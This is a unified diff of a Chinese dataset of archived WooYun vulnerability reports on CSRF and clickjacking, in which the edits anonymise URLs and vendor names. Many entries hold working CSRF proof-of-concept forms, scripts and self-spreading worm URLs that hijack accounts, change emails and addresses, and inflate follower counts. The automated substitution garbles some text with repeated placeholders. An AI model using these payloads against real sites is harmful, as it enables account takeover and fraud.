 **详情**: 昨天提交了一个：WooYun: 用一个低级的漏洞向豌豆荚用户手机后台静默推送并安装任意应用这是CSRF引起的问题，而前端安全中还有一个和CSRF是好兄弟的漏洞类型：Clickjacking（点击劫持）是一种视觉欺骗手段，在web端就是iframe嵌套一个透明不可见的页面，让用户在不知情的情况下，点击攻击者想要欺骗用户点击的位置通过测试发现wandoujia.com域下所有网站都没有对ClickJacking做防护，即使你们修复了CSRF，利用这个漏洞还是可以造成同样的攻击效果。#POC构造思路在手机客户端安装豌豆荚且登录的用户可以通过豌豆荚网页版向自己的手机无数据线推送应用，很方便，但是因为没有对ClickJacking做应有的防御,可以构造POC网页恶意网页有可能是一个网页游戏，也有可能是一个假的领奖页面，如下：看上去是个领奖页面，但是其实这个页面下面还覆盖了一层，我们将最上面这层设置为
 
-**POC**: POC代码：链接: http://pan.baidu.com/s/1gd3RGC7 密码: qgu5*仅作演示使用，没有做的过于精细，要攻击起来可以做的逼真，达到欺骗效果
+**POC**: POC代码：链接: https://example.com/[已脱敏] 密码: qgu5*仅作演示使用，没有做的过于精细，要攻击起来可以做的逼真，达到欺骗效果
 
 **绕过**: 直接利用
 
-**修复**: 国内几个大型网站很多业务都没有做ClickJacking的防御，可能是因为“攻击成本太高了”，但是一旦被利用，也会造成不小的危害，发这个报告另一个目的是为了证明ClickJacking不只是能用来给自己的微博微博刷刷粉的漏洞类型。JS防御方案（核心思路是判断自身是否在网页框架的最顶层）<head><
+**修复**: 国内几个大型网站很多业务都没有做ClickJacking的防御，可能是因为“攻击成本太高了”，但是一旦被利用，也会造成不小的危害，发这个报告另一个目的是为了证明ClickJacking不只是能用来给自己的某社交平台某社交平台刷刷粉的漏洞类型。JS防御方案（核心思路是判断自身是否在网页框架的最顶层）<head><
 ---
 
 ---
-### [wooyun-2014-054895] 太平洋电脑网-淘宝 OAuth 2.0 redirect_uir CSRF 漏洞
+### [wooyun-2014-054895] 太平洋电脑网-某电商平台 OAuth 2.0 redirect_uir CSRF 漏洞
 **厂商**: 太平洋电脑网 | **年份**: 2014 | **类型**: CSRF
 
 **元思考**: 触发信号: 认证接口
@@ -7781,7 +7781,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 太平洋电脑网-淘宝 OAuth 2.0 认证流程中https://graph.qq.com/oauth2.0/authorize?response_type=code&scope=get_user_info,get_simple_userinfo,add_topic,upload_pic,add_share&redirect_uri=http%3A%2F%2Fpassport2.pcbaby.com.cn%2Fpassport2%2Fapi%2Fopen_oauth.jsp&state=loginBind%3Dhttp%3A%2F%2Fmy.pcbaby.com.cn%2Fpassport%2Fopens%2Fbind_done.jsp%26type%3Dqzone_baby%26return%3Dhttp%3A%2F%2Fmy.pcbaby.com.cn%2Fuser%2Fsetting
+**详情**: 太平洋电脑网-某电商平台 OAuth 2.0 认证流程中https://example.com/[已脱敏]
 
 **POC**: (见原文)
 
@@ -7791,8 +7791,8 @@
 ---
 
 ---
-### [wooyun-2012-08611] 网易某处CSRF漏洞
-**厂商**: 网易 | **年份**: 2012 | **类型**: CSRF
+### [wooyun-2012-08611] 某互联网公司某处CSRF漏洞
+**厂商**: 某互联网公司 | **年份**: 2012 | **类型**: CSRF
 
 **元思考**: 触发信号: 功能测试
 
@@ -7805,7 +7805,7 @@
 
 **详情**: 在接受POST和GET的信息的时候，未对POST来路(Referer)进行验证，同时也没有在POST的信息中加token验证信息的正确性，导致漏洞产生。
 
-**POC**: 漏洞地址：http://t.163.com/tweet.do?action=addTweet<html><body><form id="imlonghao" name="imlonghao" action="http://t.163.com/tweet.do?action=addTweet" method="post"><input type="text" name="content" value="XXXXXXXXXXX" /><input type="submit" value="submit" /></form><script>document.imlonghao.submit();</
+**POC**: 漏洞地址：https://example.com/[已脱敏] id="imlonghao" name="imlonghao" action="https://example.com/[已脱敏]" method="post"><input type="text" name="content" value="XXXXXXXXXXX" /><input type="submit" value="submit" /></form><script>document.imlonghao.submit();</
 
 **绕过**: 直接利用
 
@@ -7827,7 +7827,7 @@
 
 **详情**: 
 
-**POC**: <html><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><title>CSRF  POC</title></head><body><form action="http://pan.suning.com/cloud-web/operate/createNewFolder.htm" method="post"><input type="hidden" name="folderName" value="&#x59B9;&#x7EB8;&#xFF0C;&#x6765;&#x4E00;&#x70AE;&
+**POC**: <html><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><title>CSRF  POC</title></head><body><form action="https://example.com/[已脱敏]" method="post"><input type="hidden" name="folderName" value="&#x59B9;&#x7EB8;&#xFF0C;&#x6765;&#x4E00;&#x70AE;&
 
 **绕过**: 直接利用
 
@@ -7847,7 +7847,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 评论内容可以进行任意删除,利用csrf漏洞~让作者去浏览自己设置好的页面~~评论的id在源代码中可以找到 如图：然后我们 直接 一句话htmldel=｛写如删除的评论id｝<img src="http://write.blog.csdn.net/feedback?del=4630019">clickok 搞定~~~
+**详情**: 评论内容可以进行任意删除,利用csrf漏洞~让作者去浏览自己设置好的页面~~评论的id在源代码中可以找到 如图：然后我们 直接 一句话htmldel=｛写如删除的评论id｝<img src="https://example.com/[已脱敏]">clickok 搞定~~~
 
 **POC**: 如上所说~~~
 
@@ -7869,7 +7869,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 个人资料这里，post的其实用get也行。。到圈子发张图http://my.115.com/?ct=account&amp;ac=update_user_info&amp;form%5Buser_name%5D=xxxxxx看改了还有不少的地方有，比如加好友然后要命的是那个 用钱摇摇的地方也有。。把人钱用掉了然后打赏的地方你猜有没有？？
+**详情**: 个人资料这里，post的其实用get也行。。到圈子发张图https://example.com/[已脱敏] 用钱摇摇的地方也有。。把人钱用掉了然后打赏的地方你猜有没有？？
 
 **POC**: 上面都说了，基本全站好多地方都有，不一一列举。。顺便给个年会吧。。
 
@@ -7891,7 +7891,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: http://www.meipai.com  看到美拍，我们注册两个帐号。然后看到有关注，OK，抓包看下。我们构造poc我们换个帐号登录
+**详情**: https://example.com/[已脱敏]  看到美拍，我们注册两个帐号。然后看到有关注，OK，抓包看下。我们构造poc我们换个帐号登录
 
 **POC**: 请看下图 关注成功
 
@@ -7935,13 +7935,13 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 漏洞有两处，存在于账号管理的修改绑定邮箱和修改绑定手机号处漏洞url:https://www.95598pay.com/rest/hxindividualuserinfo/emailOpenUpdatehttps://www.95598pay.com/rest/hxindividualuserinfo/phoneOpenUpdate问题点：已绑定邮箱和手机号的账号，在修改绑定手机号和邮箱时，可以直接走未绑定邮箱和手机号的初次设置手机号和邮箱的流程。即：账号在初次设置手机号和邮箱的时候，代码没有首先校验该账号是否已经绑定手机和邮箱。从而导致了已绑定手机号邮箱的账号可以进入初次绑定流程。另外，这里的初次绑定邮箱和手机号的流程就是一个录入的过程，不需要去校验，于是存在CSRF漏洞，结合CSRF和这两处漏洞，攻击者可以伪装请求，攻击其他账号甚至钓鱼管理员，神不知鬼不觉地修改其手机号和邮箱，然后走找
+**详情**: 漏洞有两处，存在于账号管理的修改绑定邮箱和修改绑定手机号处漏洞url:https://example.com/[已脱敏]
 
-**POC**: 看我的证明：1.任意修改绑定邮箱我写一个poc表单，命名：phoneOpenUpdate.html，伪造初次设置邮箱的请求，在本地搭个服务器，访问地址：http://192.168.55.36:8035/phoneOpenUpdate.html代码如下：当任意登录账号访问上面的地址，即默默地修改了其绑定邮箱看看是否成功：2.修改手机号，思路一样，看截图吧看看是否成功：然后就可以哈皮滴找回登录密码、找回支付密码，永久拥有这个账号，你值得拥有！
+**POC**: 看我的证明：1.任意修改绑定邮箱我写一个poc表单，命名：phoneOpenUpdate.html，伪造初次设置邮箱的请求，在本地搭个服务器，访问地址：http://[IP已脱敏]
 
 **绕过**: 直接利用
 
-**修复**: 这两处漏洞url做好代码校验:https://www.95598pay.com/rest/hxindividualuserinfo/emailOpenUpdatehttps://www.95598pay.com/rest/hxindividualuserinfo/phoneOpenUpdate
+**修复**: 这两处漏洞url做好代码校验:https://example.com/[已脱敏]
 ---
 
 ---
@@ -7957,7 +7957,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 1.3g.renren.comreferer检查比较水，只要是http://XXXXrenren.com/的URL都能通过。2.mt.renren.com这个触屏网站和3g.renren.com的cookie是共用的，完全没有检查referer。。ps：人人网的CSRF真是多。。而且是屡教不改型的。。但凡是有活动页面，基本都会出现，从清华校庆到人人6周年，都是一堆。
+**详情**: 1.3g.renren.comreferer检查比较水，只要是https://example.com/[已脱敏]
 
 **POC**: 试试就知道了。。
 
@@ -7967,8 +7967,8 @@
 ---
 
 ---
-### [wooyun-2012-04537] CSRF导致微博应用自动授权
-**厂商**: 新浪 | **年份**: 2012 | **类型**: CSRF
+### [wooyun-2012-04537] CSRF导致某社交平台应用自动授权
+**厂商**: 某社交平台 | **年份**: 2012 | **类型**: CSRF
 
 **元思考**: 触发信号: 认证接口
 
@@ -7979,7 +7979,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 新浪微博对于第三方应用授权使用微博数据，是使用OAuth协议进行认证。第三方应用需要使用用户数据时，需要用户登录后点击授权按钮才可进行。但是由于授权按钮提交表单数据全可预知，因此使用csrf，构造类似表单自动提交，即可让已经登录的用户在不知情的情况下授权第三方应用。
+**详情**: 某社交平台某社交平台对于第三方应用授权使用某社交平台数据，是使用OAuth协议进行认证。第三方应用需要使用用户数据时，需要用户登录后点击授权按钮才可进行。但是由于授权按钮提交表单数据全可预知，因此使用csrf，构造类似表单自动提交，即可让已经登录的用户在不知情的情况下授权第三方应用。
 
 **POC**: (见原文)
 
@@ -8003,7 +8003,7 @@
 
 **详情**: 1.等待用户登陆后，诱使点击构造的页面（如可以在游戏聊天里构造链接），可CSRF修改用户的密保问题及答案。2.在找回密码功能里输入密保答案即可修改用户的密码。3.然后......~_^
 
-**POC**: CSRF表单代码：<form action="http://www.37wan.com/users/home.php" method="post"><input type="hidden" name="action" value="updateInfo" /><input type="hidden" name="name" value="pig" /><input type="hidden" name="id_card_number" value="110101198601011615" /><input type="hidden" name="question" value="你是猪吗?" 
+**POC**: CSRF表单代码：<form action="https://example.com/[已脱敏]" method="post"><input type="hidden" name="action" value="updateInfo" /><input type="hidden" name="name" value="pig" /><input type="hidden" name="id_card_number" value="110101198601011615" /><input type="hidden" name="question" value="你是猪吗?" 
 
 **绕过**: 直接利用
 
@@ -8011,8 +8011,8 @@
 ---
 
 ---
-### [wooyun-2015-0158299] 新浪微博一处CSRF可刷粉丝
-**厂商**: 新浪微博 | **年份**: 2015 | **类型**: CSRF
+### [wooyun-2015-0158299] 某社交平台某社交平台一处CSRF可刷粉丝
+**厂商**: 某社交平台某社交平台 | **年份**: 2015 | **类型**: CSRF
 
 **元思考**: 触发信号: 功能测试
 
@@ -8025,7 +8025,7 @@
 
 **详情**: 
 
-**POC**: <!DOCTYPE HTML><html><body><form id="demo" name="demo" action="http://pay.sc.weibo.com/aj/service/followed" method="POST"><input type="text" name="uid" value="3975359730" /><input type="text" name="ispage" value="1" /><input type="text" name="_t" value="0" /><input type="submit" value="submit" /></f
+**POC**: <!DOCTYPE HTML><html><body><form id="demo" name="demo" action="https://example.com/[已脱敏]" method="POST"><input type="text" name="uid" value="3975359730" /><input type="text" name="ispage" value="1" /><input type="text" name="_t" value="0" /><input type="submit" value="submit" /></f
 
 **绕过**: 直接利用
 
@@ -8045,9 +8045,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: http://www.epeaksport.com个人资料处POC<html><body><form action="http://www.epeaksport.com/XP001-MemberDatum/saveData.html" method="POST"><input type="hidden" name="nickName" value="wooyun" /><input type="hidden" name="remark" value="wooyun" /><input type="hidden" name="theName" value="wooyun" /><input type="hidden" name="theSex" value="" /><input type="hidden" name="telephone" value="" /><input type="h
+**详情**: https://example.com/[已脱敏] action="https://example.com/[已脱敏]" method="POST"><input type="hidden" name="nickName" value="wooyun" /><input type="hidden" name="remark" value="wooyun" /><input type="hidden" name="theName" value="wooyun" /><input type="hidden" name="theSex" value="" /><input type="hidden" name="telephone" value="" /><input type="h
 
-**POC**: 修改收货地址<html><body><form action="http://www.epeaksport.com/XP001-Shopping-Order/saveAddress.html" method="POST"><input type="hidden" name="addressProvince" value="01&#46;14" /><input type="hidden" name="addressCity" value="01&#46;14&#46;01" /><input type="hidden" name="addressCounty" value="01&#46;14
+**POC**: 修改收货地址<html><body><form action="https://example.com/[已脱敏]" method="POST"><input type="hidden" name="addressProvince" value="01&#46;14" /><input type="hidden" name="addressCity" value="01&#46;14&#46;01" /><input type="hidden" name="addressCounty" value="01&#46;14
 
 **绕过**: 直接利用
 
@@ -8067,9 +8067,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 我就简单切入主题吧，最近开张了社区（http://plus.zealer.com/），那就要非常注意CSRF蠕虫了。互动越多，传播的威力就越大。经检查，用户中心（http://www.zealer.com/user?type=info）（http://plus.zealer.com/user）的各项敏感操作均无防御CSRF（如增加token或验证referer）。那么问题来了，如何利用社区互动的力量把CSRF攻击最大化？我简单编写了一个POC，请看：
+**详情**: 我就简单切入主题吧，最近开张了社区（https://example.com/[已脱敏]
 
-**POC**: <html><body><script>function submitRequest(){var xhr = new XMLHttpRequest();xhr.open("POST", "http://www.zealer.com/user/reUpload", true);xhr.setRequestHeader("Accept", "application/json, text/javascript, */*; q=0.01");xhr.setRequestHeader("Accept-Language", "zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3");xh
+**POC**: <html><body><script>function submitRequest(){var xhr = new XMLHttpRequest();xhr.open("POST", "https://example.com/[已脱敏]", true);xhr.setRequestHeader("Accept", "application/json, text/javascript, */*; q=0.01");xhr.setRequestHeader("Accept-Language", "zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3");xh
 
 **绕过**: 直接利用
 
@@ -8077,8 +8077,8 @@
 ---
 
 ---
-### [wooyun-2013-019683] 腾讯微博clickhijacking(不要被你的双眼欺骗)
-**厂商**: 腾讯 | **年份**: 2013 | **类型**: CSRF
+### [wooyun-2013-019683] 某互联网公司某社交平台clickhijacking(不要被你的双眼欺骗)
+**厂商**: 某互联网公司 | **年份**: 2013 | **类型**: CSRF
 
 **元思考**: 触发信号: 功能测试
 
@@ -8089,9 +8089,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 表面上她是这样其实她是这样点击了之后就是这样了是在上次的owasp 2012上面看到的，今天试了下，结果还是可以的当然，这只是一个收听的例子，还可以进行其他的操作。能干的事情还很多，就看你的思路了。比如你完全可以开发些小游戏，如“是男人就把她脱完”，“帮美女脱衣”等的小游戏来诱惑别人“帮你”点击。假设有一个腾讯微博的csrf worm，完全可以用这种方式使得用户既玩的开心，又能帮你传播这个csrf worm。总之，思想一定要猥琐。
+**详情**: 表面上她是这样其实她是这样点击了之后就是这样了是在上次的owasp 2012上面看到的，今天试了下，结果还是可以的当然，这只是一个收听的例子，还可以进行其他的操作。能干的事情还很多，就看你的思路了。比如你完全可以开发些小游戏，如“是男人就把她脱完”，“帮美女脱衣”等的小游戏来诱惑别人“帮你”点击。假设有一个某互联网公司某社交平台的csrf worm，完全可以用这种方式使得用户既玩的开心，又能帮你传播这个csrf worm。总之，思想一定要猥琐。
 
-**POC**: <html><head><title>腾讯微博clickjacking</title><script>function showHide_frame() {var text_1 = document.getElementById("target");text_1.style.opacity = this.checked ? "0.5": "0";text_1.style.filter = "progid:DXImageTransform.Microsoft.Alpha(opacity=" + (this.checked ? "50": "0") + ");"}</script></head><
+**POC**: <html><head><title>某互联网公司某社交平台clickjacking</title><script>function showHide_frame() {var text_1 = document.getElementById("target");text_1.style.opacity = this.checked ? "0.5": "0";text_1.style.filter = "progid:DXImageTransform.Microsoft.Alpha(opacity=" + (this.checked ? "50": "0") + ");"}</script></head><
 
 **绕过**: 直接利用
 
@@ -8099,7 +8099,7 @@
 ---
 
 ---
-### [wooyun-2014-061997] 搜狐微博绕过CSRF防御（安全设计缺陷）
+### [wooyun-2014-061997] 搜狐某社交平台绕过CSRF防御（安全设计缺陷）
 **厂商**: 搜狐 | **年份**: 2014 | **类型**: CSRF
 
 **元思考**: 触发信号: 功能测试
@@ -8111,9 +8111,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 搜狐微博csrf检查referer存在问题可用http://www.a.com/www.sohu.com/来绕过防御
+**详情**: 搜狐某社交平台csrf检查referer存在问题可用https://example.com/[已脱敏]
 
-**POC**: 新建html<body><form action="http://t.sohu.com/twAction/insertTwitter" method="POST"><input type=hidden name="msg" value="hello everybody"></form><script>document.forms[0].submit();</script></body>在网站新建一个www.sohu.com目录 把上面这个html丢在里面例子http://qaz.me/www.sohu.com/csrf.html微博登录状态下访问此页面成功发表微博
+**POC**: 新建html<body><form action="https://example.com/[已脱敏]" method="POST"><input type=hidden name="msg" value="hello everybody"></form><script>document.forms[0].submit();</script></body>在网站新建一个www.sohu.com目录 把上面这个html丢在里面例子https://example.com/[已脱敏]
 
 **绕过**: 过滤绕过
 
@@ -8133,7 +8133,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 修改收货地址1，查看数据包修改成功：创建html，主要代码：xmlhttp.open("POST", "http://www.flnet.com/PublicAjax/ReceiveAddressService.ashx?action=SaveAddress", true);xmlhttp.withCredentials = true;xmlhttp.setRequestHeader("Content-Type","application/x-www-form-urlencoded");xmlhttp.send("address_name=woo88&address_area_province=51&address_area_city=1007&address_area_area=5370&address_area_town=68025&address_deliver_detail=iuh
+**详情**: 修改收货地址1，查看数据包修改成功：创建html，主要代码：xmlhttp.open("POST", "https://example.com/[已脱敏]", true);xmlhttp.withCredentials = true;xmlhttp.setRequestHeader("Content-Type","application/x-www-form-urlencoded");xmlhttp.send("address_name=woo88&address_area_province=51&address_area_city=1007&address_area_area=5370&address_area_town=68025&address_deliver_detail=iuh
 
 **POC**: 同上
 
@@ -8155,7 +8155,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 原创音乐基地-人人网 OAuth 2.0 认证流程中https://graph.renren.com/oauth/authorize?client_id=117231&response_type=code&scope=publish_feed,photo_upload&state=a%3d1%26b%3d2&redirect_uri=http%3A%2F%2Fwww.5sing.com%2FOpenLoginRecive%3Ftype%3D3%26refUrl%3Dhttp%3A%2F%2Fwww.5sing.com%2Fmy%2Fset%2Fbindsns%2F3%3Fcommand%3Dbind&x_renew=true原创音乐基地并没有提供有效方式抵抗针对redirect_uir 的CSRF 攻击。如果攻击者重新发起一个原创音乐基地-人人网  OAuth 2.0 认证请求，并截获OA
+**详情**: 原创音乐基地-人人网 OAuth 2.0 认证流程中https://example.com/[已脱敏] 的CSRF 攻击。如果攻击者重新发起一个原创音乐基地-人人网  OAuth 2.0 认证请求，并截获OA
 
 **POC**: (见原文)
 
@@ -8165,8 +8165,8 @@
 ---
 
 ---
-### [wooyun-2012-09502] 新浪微博某处CSRF漏洞
-**厂商**: 新浪 | **年份**: 2012 | **类型**: CSRF
+### [wooyun-2012-09502] 某社交平台某社交平台某处CSRF漏洞
+**厂商**: 某社交平台 | **年份**: 2012 | **类型**: CSRF
 
 **元思考**: 触发信号: 功能测试
 
@@ -8177,9 +8177,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 在接受POST和GET的信息的时候，未对POST来路(Referer)进行验证，同时也没有在POST的信息中加token验证信息的正确性，导致漏洞产生。漏洞几乎都是处在微女郎这个站。http://vgirl.weibo.com
+**详情**: 在接受POST和GET的信息的时候，未对POST来路(Referer)进行验证，同时也没有在POST的信息中加token验证信息的正确性，导致漏洞产生。漏洞几乎都是处在微女郎这个站。https://example.com/[已脱敏]
 
-**POC**: =========加关注漏洞地址：http://vgirl.weibo.com/interface/weibo/friendships.php<html><body><form id="imlonghao" name="imlonghao" action="http://vgirl.weibo.com/interface/weibo/friendships.php?act=follow" method="post"><input type="text" name="uid" value="1747906692" /></form><script>document.imlonghao.submi
+**POC**: =========加关注漏洞地址：https://example.com/[已脱敏] id="imlonghao" name="imlonghao" action="https://example.com/[已脱敏]" method="post"><input type="text" name="uid" value="1747906692" /></form><script>document.imlonghao.submi
 
 **绕过**: 直接利用
 
@@ -8209,8 +8209,8 @@
 ---
 
 ---
-### [wooyun-2012-06947] 腾讯分站 Apache 漏洞
-**厂商**: 腾讯 | **年份**: 2012 | **类型**: 系统/服务补丁不及时
+### [wooyun-2012-06947] 某互联网公司分站 Apache 漏洞
+**厂商**: 某互联网公司 | **年份**: 2012 | **类型**: 系统/服务补丁不及时
 
 **元思考**: 触发信号: 功能测试
 
@@ -8221,9 +8221,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: Apache httponly cookie 泄露，个人认为介算是CSRF...http://www.vip.qq.com
+**详情**: Apache httponly cookie 泄露，个人认为介算是CSRF...https://example.com/[已脱敏]
 
-**POC**: 1；打开 ： http://vip.qq.com/  截获并修改cookie信息为超长：说明：如果操作成功，只会出现两次，第一次是来至 host: vip.qq.com第二次来至 host：vipfunc.qq.com 两次拦截只需将cookie值修改为超长即可，如果有大量的Request去拥抱你，那恭喜！你操作慢了。2；两次拦截并修改操作后，返回400：血色那坨是啥都知道了，跟之前的输入是相对应的，不过Apache的默认配置LimitRequestFieldSize是有最大限度的。这个是对httponly的影响，当然了，这里只是做下重现演示，如果有银精心设计.....你懂得。不晓得其他站有木
+**POC**: 1；打开 ： https://example.com/[已脱敏]  截获并修改cookie信息为超长：说明：如果操作成功，只会出现两次，第一次是来至 host: vip.某互联网公司.com第二次来至 host：vipfunc.某互联网公司.com 两次拦截只需将cookie值修改为超长即可，如果有大量的Request去拥抱你，那恭喜！你操作慢了。2；两次拦截并修改操作后，返回400：血色那坨是啥都知道了，跟之前的输入是相对应的，不过Apache的默认配置LimitRequestFieldSize是有最大限度的。这个是对httponly的影响，当然了，这里只是做下重现演示，如果有银精心设计.....你懂得。不晓得其他站有木
 
 **绕过**: 直接利用
 
@@ -8245,7 +8245,7 @@
 
 **详情**: 街旁网更改邮箱处未验证token，可通过攻击者精心构造的一个表单修改掉中招者的邮箱，然后就可以找回密码达到劫持的目的了。由于邮箱需要唯一性，所以可以通过一个数组来随机抽取邮箱。
 
-**POC**: POC:<html><body><form name="csrf" action="http://jiepang.com/settings/account" method="POST"><script>var email =['root1@wooyun.org','root2@wooyun.org','root3@wooyun.org','root4@wooyun.org','root5@wooyun.org','root6@wooyun.org','root7@wooyun.org','root8@wooyun.org','root9@wooyun.org','root10@wooyun.o
+**POC**: POC:<html><body><form name="csrf" action="https://example.com/[已脱敏]" method="POST"><script>var email =['root1@wooyun.org','root2@wooyun.org','root3@wooyun.org','root4@wooyun.org','root5@wooyun.org','root6@wooyun.org','root7@wooyun.org','root8@wooyun.org','root9@wooyun.org','root10@wooyun.o
 
 **绕过**: 直接利用
 
@@ -8253,8 +8253,8 @@
 ---
 
 ---
-### [wooyun-2013-026265] 腾讯微博csrf删除用户微博
-**厂商**: 腾讯 | **年份**: 2013 | **类型**: CSRF
+### [wooyun-2013-026265] 某互联网公司某社交平台csrf删除用户某社交平台
+**厂商**: 某互联网公司 | **年份**: 2013 | **类型**: CSRF
 
 **元思考**: 触发信号: 功能测试
 
@@ -8265,7 +8265,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 问题依然是：t.hk.qq.com1.发表一条微博点击删除并抓包，直接GET请求；http://t.hk.qq.com/index.php/index/t/del/tid/12345678902.每条微博的id可直接查询，构造如下请求发布；3.点击刚刚发布的微博，效果如下；4.返回页面刷新，该条微博已经成功删除；
+**详情**: 问题依然是：t.hk.某互联网公司.com1.发表一条某社交平台点击删除并抓包，直接GET请求；https://example.com/[已脱敏]
 
 **POC**: 见详细说明
 
@@ -8275,8 +8275,8 @@
 ---
 
 ---
-### [wooyun-2016-0167674] 新浪微博CSRF之点我链接发微博（可蠕虫）
-**厂商**: 新浪微博 | **年份**: 2016 | **类型**: CSRF
+### [wooyun-2016-0167674] 某社交平台某社交平台CSRF之点我链接发某社交平台（可蠕虫）
+**厂商**: 某社交平台某社交平台 | **年份**: 2016 | **类型**: CSRF
 
 **元思考**: 触发信号: 功能测试
 
@@ -8287,9 +8287,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 功能在这个页面：http://ku.ent.sina.com.cn/movie/24413的评分写评论处，支持分享到微博。有检查referer，但可以被绕过，只要referer中带有：ku.ent.sina.com.cn即可以绕过，例如：http://test.com?http://ku.ent.sina.com.cn/movie/24413
+**详情**: 功能在这个页面：https://example.com/[已脱敏]
 
-**POC**: 测试页面<form action="http://ku.ent.sina.com.cn/comment/add_comment" method="post"><input type="text" name="id" value="24413"/><input type="text" name="res_name" value="movie"/><input type="text" name="newsid" value="dafen_movietest2_24413"/><input type="text" name="allScore" value="10"/><input type="te
+**POC**: 测试页面<form action="https://example.com/[已脱敏]" method="post"><input type="text" name="id" value="24413"/><input type="text" name="res_name" value="movie"/><input type="text" name="newsid" value="dafen_movietest2_24413"/><input type="text" name="allScore" value="10"/><input type="te
 
 **绕过**: 过滤绕过
 
@@ -8309,7 +8309,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: POST http://www.danmu.com/api/playDANMU_CSRF_TOKEN=02b2e2712b2c75eac727623c455c692477b13707&postId=56993&guestId=1435631285609postId参数存在注射
+**详情**: POST https://example.com/[已脱敏]
 
 **POC**: (见原文)
 
@@ -8331,9 +8331,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 盛大游戏社区http://wan.sdo.com/#1>发帖子或者发回复的时候，插入网络图片处判断不严格，url地址可以随意修改。。#2>小菜不会玩csrf，就找了个关注，然后吧，这个关注竟然Get一样可以实现。。so..
+**详情**: 盛大游戏社区https://example.com/[已脱敏]
 
-**POC**: 想测试csrf，但是无奈小菜不会玩。就只刷个粉丝测试下。。关注：http://wan.sdo.com/api/AddAttention?id=364711.插入网络图片http://wan.sdo.com/api/AddAttention?id=364712.发布之后然后访问这篇帖子的人，就会自动关注我们了。：）3.找小号测试下。（社区活跃人不多）直观点，我们直接访问，src标签也是get，效果一样。：）
+**POC**: 想测试csrf，但是无奈小菜不会玩。就只刷个粉丝测试下。。关注：https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -8363,8 +8363,8 @@
 ---
 
 ---
-### [wooyun-2014-075352] 新浪微博csrf刷粉丝
-**厂商**: 新浪 | **年份**: 2014 | **类型**: CSRF
+### [wooyun-2014-075352] 某社交平台某社交平台csrf刷粉丝
+**厂商**: 某社交平台 | **年份**: 2014 | **类型**: CSRF
 
 **元思考**: 触发信号: 认证接口
 
@@ -8375,9 +8375,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 没有对referer验证，没有加token导致登陆http://nba.weibo.com/ nba官方社区点击关注 抓包 只有uid。。
+**详情**: 没有对referer验证，没有加token导致登陆https://example.com/[已脱敏] nba官方社区点击关注 抓包 只有uid。。
 
-**POC**: 构造poc<!DOCTYPE HTML><html><body><form id="demo" name="demo" action="http://nba.weibo.com/?anu=follow/ajax/add_follow" method="POST"><input type="text" name="uid" value="3138469231" /><input type="submit" value="submit" /></form><script>document.demo.submit();</script></body></html>这是我没访问之前的关注访问之后页面虽
+**POC**: 构造poc<!DOCTYPE HTML><html><body><form id="demo" name="demo" action="https://example.com/[已脱敏]" method="POST"><input type="text" name="uid" value="3138469231" /><input type="submit" value="submit" /></form><script>document.demo.submit();</script></body></html>这是我没访问之前的关注访问之后页面虽
 
 **绕过**: 直接利用
 
@@ -8399,7 +8399,7 @@
 
 **详情**: ~~
 
-**POC**: <html><!-- CSRF PoC - generated by Burp Suite Professional --><body><form action="http://v.6.cn/message/follow_add.php"><input type="hidden" name="tuid" value="38015632" /><input type="hidden" name="act" value="p" /><input type="hidden" name="format" value="json" /></form></body><script>document.for
+**POC**: <html><!-- CSRF PoC - generated by Burp Suite Professional --><body><form action="https://example.com/[已脱敏]"><input type="hidden" name="tuid" value="38015632" /><input type="hidden" name="act" value="p" /><input type="hidden" name="format" value="json" /></form></body><script>document.for
 
 **绕过**: 直接利用
 
@@ -8419,9 +8419,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 无意间看见的一个忽略的bug评论上面信息得到是使用的request然后顺藤摸瓜得到发微博的请求地址：然后发现 发微博的时候图片地址没有限制或者过滤，那么我们就用img 的 src 来构造 csrf蠕虫 传播微博http://i.yinyuetai.com/wb/post/doPost.action?content=aa&picture=http%3A%2F%2Fi.yinyuetai.com%2Fwb%2Fpost%2FdoPost.action%3Fcontent%3Dc%26picture%3Dhttp%253A%252F%252Fi.yinyuetai.com%252Fwb%252Fpost%252FdoPost.action%253Fcontent%253Df%2526picture%253Dhttp%25253A%25252F%25252Fi.yinyuetai.com%2525
+**详情**: 无意间看见的一个忽略的bug评论上面信息得到是使用的request然后顺藤摸瓜得到发某社交平台的请求地址：然后发现 发某社交平台的时候图片地址没有限制或者过滤，那么我们就用img 的 src 来构造 csrf蠕虫 传播某社交平台https://example.com/[已脱敏]
 
-**POC**: 被感染关注好友。。f  的意思是加粉丝c  的意思就是创建f那条微博完成关注我 继续帮我传播..
+**POC**: 被感染关注好友。。f  的意思是加粉丝c  的意思就是创建f那条某社交平台完成关注我 继续帮我传播..
 
 **绕过**: 直接利用
 
@@ -8429,7 +8429,7 @@
 ---
 
 ---
-### [wooyun-2013-046515] 搜狐个人中心CSRF删除指定用户的微博
